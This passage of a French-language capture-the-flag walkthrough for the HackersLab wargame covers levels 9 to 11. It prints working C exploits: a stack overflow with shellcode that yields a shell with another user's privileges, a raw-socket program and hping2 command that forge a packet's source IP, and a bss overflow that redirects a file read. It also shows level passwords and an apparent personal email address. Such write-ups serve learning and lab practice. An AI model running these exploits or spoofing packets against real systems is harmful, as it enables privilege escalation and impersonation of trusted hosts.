+  if (argc > 1) bsize   = atoi(argv[1]);
+  if (argc > 2) offset  = atoi(argv[2]);
+  if (argc > 3) eggsize = atoi(argv[3]);
+
+
+  if (!(buff = malloc(bsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+  if (!(egg = malloc(eggsize))) {
+    printf("Can't allocate memory.\n");
+    exit(0);
+  }
+
+  addr = get_esp() - offset;
+  printf("Using address: 0x%x\n", addr);
+
+  ptr = buff;
+  addr_ptr = (long *) ptr;
+  for (i = 0; i < bsize; i+=4)
+    *(addr_ptr++) = addr;
+
+  ptr = egg;
+  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
+    *(ptr++) = NOP;
+
+  for (i = 0; i < strlen(shellcode); i++)
+    *(ptr++) = shellcode[i];
+
+  buff[bsize - 1] = '\0';
+  egg[eggsize - 1] = '\0';
+
+  memcpy(egg,"EGG=",4);
+  putenv(egg);
+  memcpy(buff,"RET=",4);
+  putenv(buff);
+  system("/bin/bash");
+}
+*****************************************************************************
+
+[level9@drill level9]$ gcc ~/tmp/exploit.c -o ~/tmp/exploit
+[level9@drill level9]$ ~/tmp/exploit
+Using address: 0xbffffa78
+[level9@drill level9]$ /etc/bof $RET
+hello~ xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xúÿ¿xú
+ÿ¿xúÿ¿xúÿ¿
+bash$ id
+uid=2009(level9) gid=2009(level9) euid=2010(level10) groups=2009(level9)
+bash$ /bin/pass
+-----------------------------------------------------------------------------
+                              [ LEVEL 10 ]
+-----------------------------------------------------------------------------
+                                                        ..::''''::..
+                                              .:::.   .;''        ``;.
+      ....                                    :::::  ::    ::  ::    ::
+    ,;' .;:                ()  ..:            `:::' ::     ::  ::     ::
+    ::.      ..:,:;.,:;.    .   ::   .::::.    `:'  :: .:' ::  :: `:. ::
+     '''::,   ::  ::  ::  `::   ::  ;:   .::    :   ::  :          :  ::
+   ,:';  ::;  ::  ::  ::   ::   ::  ::,::''.    .    :: `:.      .:' ::
+   `:,,,,;;' ,;; ,;;, ;;, ,;;, ,;;, `:,,,,:'   :;:    `;..``::::''..;'
+                                                        ``::,,,,::''
+
+        password : Beauty and Beast
+
+-----------------------------------------------------------------------------
+
+
+
+
+
+############################## { Level 10 } #################################
+
+*--------------------------------------------------------------------------*
+| A daemon in the Free Hacking Zone uses the UDP5555 port.  This daemon is |
+| waiting for the packets to arrive from the www.hackerslab.org host.  The |
+| packets include the email address of the recipient as well as the        |
+| password for level 10.  The daemon will notify the password for the next |
+| level via email as soon as it receives the packets from                  |
+| www.hackerslab.org.                                                      |
+|                                                                          |
+| The format is as follows:                                                |
+| `The password of level 10` / `email address`.                            |
+| Example: If the password for level 10 is `abcd` and the email address is |
+| `abc@aaa.ccc.ddd.rr`, then the message in the packet is                  |
+| abcd/abc@aaa.ccc.ddd.rr                                                  |
+| *Remember to send the packet from www.hackerslab.org.                    |
+ *-------------------------------------------------------------------------*
+
+On change totalement de décor cette fois ! Le but va être d'envoyer un paquet
+UDP vers un daemon tournant sur le port 5555 de drill.hackerslab.org, en pre-
+-nant soin de modifier l'adresse IP source dans l'entête IP de manière à fai-
+-re croire que le paquet provient de l'adresse www.hackerslab.org, et en met-
+-tant dans les données UDP une chaîne de caractères du type 'pass_level10/
+adresse_email". Si tout est correct, on doit reçevoir le mot de passe du ni-
+-veau 11 à l'adresse email indiquée.
+
+On peut faire ça de deux manières, soit dans un programme en C en utilisant
+les raw socket [4], soit avec hping2 [5].
+
+
+.: Avec hping2 :.
+
+# hping2 -2 -a 203.239.110.2 -p 5555 -c 1 -e "Beauty and Beast/virgil.hemery@
+wanadoo.fr" -d 42 203.239.110.20
+HPING 203.239.110.20 (ppp0 203.239.110.20):
+udp mode set, 28 headers + 41 data bytes
+
+--- 203.239.110.20 hping statistic ---
+1 packets tramitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+
+.: Dans un programme en C :.
+*****************************************************************************
+/* level10.c - by virgil
+<virgil.hemery@wanadoo.fr> */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <linux/ip.h>
+#include <linux/udp.h>
+
+#define DATA_SIZE 42
+#define DATA "Beauty and Beast/virgil.hemery@wanadoo.fr"
+
+
+struct packet
+{
+ struct iphdr pip;
+ struct udphdr pudp;
+ char data[DATA_SIZE];
+};
+
+unsigned long resolve(char *sname);
+unsigned short in_cksum(u_short *addr,int len);
+
+
+int main(void)
+{
+ int fd;
+ struct packet *udppkt;
+ struct sockaddr_in remote;
+
+ udppkt=(struct packet *) malloc(sizeof(struct packet));
+ bzero(udppkt, sizeof(struct packet));
+
+ udppkt->pip.saddr         =   resolve("203.239.110.2");
+ udppkt->pip.daddr         =   resolve("203.239.110.20");;
+ udppkt->pip.version       =   4;
+ udppkt->pip.ihl           =   5;
+ udppkt->pip.ttl           =   255;
+ udppkt->pip.protocol      =   17;
+ udppkt->pip.tos           =   0;
+ udppkt->pip.id            =   htons (random());
+ udppkt->pip.frag_off      =   0;
+
+ udppkt->pudp.source=htons(random());
+ udppkt->pudp.dest=htons(5555);
+ udppkt->pudp.len=DATA_SIZE+8;
+ memcpy((char *)&udppkt->data,DATA,DATA_SIZE);
+ udppkt->pudp.check=(unsigned short)in_cksum((unsigned short *)&udppkt->pudp,
+ sizeof(struct udphdr)+DATA_SIZE);
+
+
+ if( (fd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW) )<0)
+     {
+     perror("SOCK_RAW");
+     return(-1);
+     }
+
+ remote.sin_family = AF_INET;
+ remote.sin_addr.s_addr = udppkt->pip.daddr;
+ remote.sin_port = udppkt->pudp.dest;
+
+ if(sendto(fd,udppkt,sizeof(struct udphdr)+sizeof(struct iphdr)+DATA_SIZE,0,
+ (struct sockaddr *)&remote,sizeof (struct sockaddr)) == -1)
+ {
+  perror("sendto()");
+  return(-1);
+ }
+
+ printf("Packet sent, now check your mailbox ;)\n");
+ return 0;
+}
+
+
+unsigned long resolve(char *sname)
+{
+ struct hostent * hip;
+ hip = gethostbyname(sname);
+ if (!hip)
+ {
+  perror("gethostbyname()");
+  return(-1);
+ }
+ return *(unsigned long *)hip -> h_addr;
+}
+
+unsigned short in_cksum(unsigned short *addr, int len)
+{
+ register int sum = 0;
+ u_short answer = 0;
+ register u_short *w = addr;
+ register int nleft = len;
+
+ while (nleft > 1)
+ {
+  sum += *w++;
+  nleft -= 2;
+ }
+ if (nleft == 1)
+ {
+  *(u_char *) (&answer) = *(u_char *) w;
+  sum += answer;
+ }
+ sum = (sum >> 16) + (sum & 0xffff);
+ sum += (sum >> 16);
+ answer = ~sum;
+ return (answer);
+}
+*****************************************************************************
+
+# tcpdump -c 1 ip proto 17 -s 86 -X &
+[1] 14005
+tcpdump: listening on ppp0
+# gcc level10.c -o level10
+# ./level10
+19:24:20.797227 203.239.110.2.9158 > 203.239.110.20.5555: udp 12792
+0x0000   4500 0046 4567 0000 ff11 024a cbef 6e02        E..FEg.....J..n.
+0x0010   cbef 6e14 23c6 15b3 3200 2c70 4265 6175        ..n.#...2.,pBeau
+0x0020   7479 2061 6e64 2042 6561 7374 2f76 6972        ty.and.Beast/vir
+0x0030   6769 6c2e 6865 6d65 7279 4077 616e 6164        gil.hemery@wanad
+0x0040   6f6f 2e66 7200                                 oo.fr.
+1 packets received by filter
+0 packets dropped by kernel
+Packet sent, now check your mailbox ;)
+[1]+  Done                    tcpdump -c 1 ip proto 17 -s 86 -X
+
+Maintenant plus qu'à attendre l'arrivée du mail contenant le mot de passe du
+niveau 11: "Permission denied".
+
+
+NB: En fait un firewall bloquait les paquets arrivant de Corée (HackersLab
+est basé en Corée), rendant impossible la réception du mail. Merci donc à
+L4rs pour m'avoir envoyer le password du niveau 11.
+
+
+
+
+
+############################## { Level 11 } #################################
+
+*------------------------------------------------------------------------*
+| You can find the /usr/local/bin/passwd.fail file by running the        |
+| /usr/local/bin/hof program.  However, we want the                      |
+| /usr/local/bin/passwd.success file which includes the password for the |
+| next level.  Go get it!                                                |
+| HINT:  Use the `heap` area.                                            |
+*------------------------------------------------------------------------*
+
+Nous aurons à exploiter dans ce niveau un programme vulnérable à un heap/bss
+overflow [6]. La section bss est une section où sont placés les données glo-
+-bales non-initialisées (variables de portée globale et variables de portée
+locale déclarées en static)
+
+Il est possible d'écrire sur cette section, le programme suivant le démontre:
+
+*****************************************************************************
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+
+#define BUFSIZE 16
+#define ADDRLEN 4
+
+int main()
+ {
+  u_long diff;
+  static char buf[BUFSIZE], *bufptr;
+
+  bufptr = buf, diff = (u_long)&bufptr - (u_long)buf;
+
+  printf("bufptr (%p) = %p, buf = %p, diff = 0x%x (%d) bytes\n",
+  &bufptr, bufptr, buf, diff, diff);
+
+  memset(buf, 'A', (u_int)(diff + ADDRLEN));
+
+  printf("bufptr (%p) = %p, buf = %p, diff = 0x%x (%d) bytes\n",
+  &bufptr, bufptr, buf, diff, diff);
+
+  return 0;
+ }
+*****************************************************************************
+
+$ gcc overflow.c -o overflow
+$ ./overflow
+bufptr (0x8049640) = 0x8049630, buf = 0x8049630, diff = 0x10 (16) bytes
+bufptr (0x8049640) = 0x41414141, buf = 0x8049630, diff = 0x10 (16) bytes
+
+On voit donc qu'il a été possible de faire déborder buf et d'écrire sur le
+pointeur bufptr (on y a écrit 0x41414141 soit "AAAA"). D'autre part, on ap-
+-prend que la distance séparant buf et bufptr est de 16 octets.
+
+Mais essayons maintenant le programme du niveau:
+
+[level11@drill tmp]$ /usr/local/bin/hof
+level11's Password : Permission denied
+
+Segmentation fault
+[level11@drill tmp]$ /usr/local/bin/hof
+level11's Password : Permission
+
+view_file = /usr/local/bin/passwd.fail
+
+hahahahahahahaha
+
+[level11@drill tmp]$ cat /usr/local/bin/passwd.fail
+hahahahahahahaha
+
+Voilà à quoi ressemble le code source du programme utilisé dans ce niveau:
+
+int main(int argc, char **argv)
+{
+ int c;
+ FILE *fic;
+ /* char *passwd="Permission denied"; */
+ static char buf[BUFSIZE], *view_file;
+ view_file = "/usr/local/bin/passwd.fail";
+ printf("level11's Password: ");
+ gets(buf);
+ /* if(!strcmp(buf,passwd))
+      view_file="/usr/local/bin/passwd.success";
+    else view_file="/usr/local/bin/passwd.fail"; */
+ printf("\nview file = %s\n\n",view_file);
+ fic = fopen(view_file, "r");
+ if (fic == NULL)
+   {
+    printf("error opening %s\n", view_file);
+    exit(ERROR);
+   }
+ while((c=fgetc(fic))!=EOF)
+   putchar(c);
+ printf("\n");
+ return 0;
+}
+
+On fera donc déborder buf pour écrire dans view_file et le faire pointer vers
+l'adresse de argv[1] (dans lequel on mettra "/usr/local/bin/passwd.success").
+Voilà maintenant un exploit pour notre programme:
+
+*****************************************************************************
+/* La chaîne d'exploitation ressemblera à:
+   [(view_file addr) - (buf addr) * 'A'][argv[1] addr] */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#define ERROR -1
+#define DIFF 16 /* différence entre buf et tmpfile dans le programme */
+#define VULPROG "/usr/local/bin/hof" /* programme à exploiter */
+#define VULFILE "/usr/local/bin/passwd.success" /* fichier à lire */
+#define DEFAULT_OFFSET 374
+
+/* Calcule l'adresse ou commence la pile */
+u_long getesp()
+  {
+   __asm__("movl %esp,%eax");
+  }
+
+int main(int argc, char *argv[])
+ {
+  u_long addr;
+  register int i;
+  int mainbufsize;
+  int offset=DEFAULT_OFFSET;
+  char *mainbuf, buf[DIFF+18+1]="Permission denied"; // password du level 11
+
+  if(argv[1]) offset=atoi(argv[1]);
+
+  memset(buf, 0, sizeof(buf)), strcpy(buf,"Permission denied");
+  memset(buf + strlen(buf), 'A', DIFF);
+
+  addr = getesp() + offset; // calcule l'adresse de argv[1]
+
+  /* inverse l'ordre des bytes (little endian) */
+  for (i = 0; i < sizeof(u_long); i++)
+    buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);
+
+  mainbufsize = strlen(buf) + strlen(VULPROG) + strlen(VULFILE) + 13;
+
+  mainbuf = (char *)malloc(mainbufsize);
+  memset(mainbuf, 0, sizeof(mainbufsize));
+
+  snprintf(mainbuf, mainbufsize - 1, "echo '%s' | %s %s\n",
+  buf, VULPROG, VULFILE); // argv[1] = VULFILE
+
+  system(mainbuf);
+  return 0;
+ }
+*****************************************************************************
+
+On essaye maintenant:
+[level11@drill tmp]$ gcc xpl.c -o xpl
+[level11@drill tmp]$ ./xpl
+level11's Password :
+view_file = /usr/local/bin/passwd.success
+
+Password : I want to love forever
+
+
+Et voilà ;)
+
+
+La suite prochainement (du moins si j'y arrive :p)
+
+
+Références:
+[1] Escape Shell For Fun And Profit, Gangstuck
+    (http://ouah.kernsh.org/escapegang.html)
+[2] Basic UNIX Exploits, m101
+    (http://arson-network.com/viewtut.php?act=vt&tid=149)
+[3] Smashing The Stack For Fun And Profit, Aleph One
+    (http://www.phrack.org/phrack/49/P49-14)
+[4] Documentation about native raw socket programming, Nitr0gen
+    (http://packetstormsecurity.nl/programming-tutorials/raw_socket.txt)
+[5] Hping2, a command-line oriented TCP/IP packet assembler/analyzer
+    (http://www.hping.org/download.html)
+[6] w00w00 on Heap Overflow, Matt Conover & w00w00 Security Team
+    (http://www.w00w00.org/files/articles/heaptut.txt)
+
+
